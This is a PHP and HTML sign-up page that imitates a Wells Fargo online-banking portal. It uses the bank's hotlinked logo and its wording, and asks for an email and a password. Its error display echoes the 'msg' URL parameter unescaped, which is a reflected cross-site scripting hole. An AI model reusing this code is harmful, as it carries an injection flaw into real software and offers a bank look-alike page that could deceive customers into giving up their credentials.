<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <link rel="stylesheet" href="/bootstrap/css/bootstrap.css">
    <script src="/js/jquery-3.5.1.js"></script>
</head>
<body>
<?php
$error = $_GET['error']??0;
$msg = $_GET['msg']??null;
?>
<div class="container-fluid">
    <form id="signup_form" method="post" action="signup_backend.php">
        <div id="login">
            <div class="topheader"></div>
            <div class="middleheader">
                <p>Sign Up for new account</p>
                <p>Enter your username and password to securely view and manage your Wells Fargo accounts online.</p>
            </div>

            <?php
            if ($error){
            ?>
            <div class="myalert_error">
                <span>
                    <?php echo $msg; ?>
                </span>
            </div>
            <?php
            }

           // echo password_hash("abc123",PASSWORD_BCRYPT);
            ?>

            <div class="loginform">
                <table>
                    <tr>
                        <td><input required="required" placeholder="Username" type="email" name="email"></td>
                    </tr>
                    <tr>
                        <td><input id="password1" placeholder="password" type="password" name="password">
                            <span class="myinput1"></span>
                            <input type="checkbox" name="show_password" id="show_password1">
                        </td>
                    </tr>
                    <tr>
                        <td><input id="password2" placeholder="Confirm Password" type="password" name="password_confirm">
                            <span class="myinput2"></span>
                            <input type="checkbox" name="show_password" id="show_password2">
                        </td>
                    </tr>


                    <tr>
                        <td colspan="2" class="td_links">
                            <a href="forgot.php">Forgot Password/Username?</a>  | <a href="index.php">Login Now</a>
                        </td>
                    </tr>

                    <tr>
                        <td colspan="2" class="td_buttons">
                            <button class="btn btn-dark" type="reset">RESET</button>
                            <button class="btn btn-danger" type="submit">LOGIN</button>
                        </td>
                    </tr>

                </table>
            </div>

        </div>
    </form>

</div>
<style>
    .myalert img{
        width: 20px;
    }
    .myalert_error{
        width: 70%;
        text-align: center;
        border-radius: 10px;
        height: 30px;
        background-color: #eec5c8;
        margin: 2px auto;
        font-size: 13px;
        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
        padding-top: 3px;
        color: darkred;
    }
    .myalert_info{
        width: 70%;
        text-align: center;
        border-radius: 10px;
        height: 30px;
        background-color: #87f2f5;
        margin: 2px auto;
        font-size: 13px;
        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
        padding-top: 3px;
        color: #031258;
    }
    .td_buttons{
        padding-top: 30px;
        text-align: center;
    }
    .td_links{
        font-size: 12px;
        text-align: left;
        padding-left: 24px;
        padding-top: 40px;
    }
    .td_save_username{
        text-align: left;
        padding-left: 24px;
        padding-top: 20px;
        font-size: 12px;
    }
    .loginform input{
        border: none;
        border-bottom: 1px solid black;
    }
    .loginform table{
        margin: auto;
        width: 70%;
    }
    .loginform{
        text-align: center;
    }
    .middleheader p:last-child{
        text-align: center;
        font-size: 11px;
    }
    .middleheader p:first-child{
        text-align: center;
        font-size: 21px;
        font-weight: bolder;
    }
    .middleheader{
        margin-top: 60px;
    }
    .topheader{
        width: 100%;
        height: 100px;
        background-image: url("https://connect.secure.wellsfargo.com/auth/static/images/WF_stagecoach_rgb_ylw_F1.svg");
        background-size: 100% 100%;
        background-repeat: no-repeat;
        background-color: #f1ebb9;
        text-align: center;
        font-size: 25px;
        font-family: "Arial Rounded MT Bold";
        font-weight: bolder;
        padding-top: 20px;
    }
    #login{
        width: 650px;
        height: 500px;
        margin: 70px auto;
        border: 1px double black;
        border-radius: 10px;
        padding: 5px;
        background-color: whitesmoke;
    }
    body{
        background-color: #4c2e00;
    }
</style>

<script>
    $(function () {
        $("#show_password1").click(function () {
            if (this.checked){
                $("#password1").attr("type","text");
            }else{
                $("#password1").attr("type","password");
            }
        });


        $("#show_password2").click(function () {
            if (this.checked){
                $("#password2").attr("type","text");
            }else{
                $("#password2").attr("type","password");
            }
        });
        $("#signup_form").submit(function () {

            let password = $("#password1").val();
            let password2 = $("#password2").val();

            if (password.length<6){
                $(".myinput1").addClass("asterisk_input");
                return false;
            }else{
                $(".myinput1").removeClass("asterisk_input");
            }

            if (password2.length<6){
                $(".myinput2").addClass("asterisk_input");
                return false;
            }else{
                $(".myinput2").removeClass("asterisk_input");
            }



        });





    })
</script>

<style>

    .asterisk_input:after{
        content: " *";
        color: red;
        font-weight: bolder;
    }


</style>
</body>
</html>